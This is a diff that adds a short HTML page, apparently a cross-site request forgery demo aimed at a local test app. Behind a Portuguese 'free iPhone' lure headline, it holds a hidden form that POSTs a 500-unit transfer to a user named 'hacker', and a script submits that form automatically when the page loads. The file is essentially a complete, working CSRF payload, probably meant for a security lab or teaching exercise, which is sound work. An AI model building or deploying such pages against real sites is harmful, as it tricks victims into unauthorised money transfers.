@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>Ganhe um iPhone grátis! Clique abaixo...</h1>
+    <form action="http://localhost:5000/transfer" method="POST" id="csrf-form">
+        <input type="hidden" name="to_user" value="hacker">
+        <input type="hidden" name="amount" value="500">
+    </form>
+
+    <script>
+        // O formulário é submetido automaticamente ao carregar a página
+        document.getElementById("csrf-form").submit();
+    </script>
+</body>
+</html>
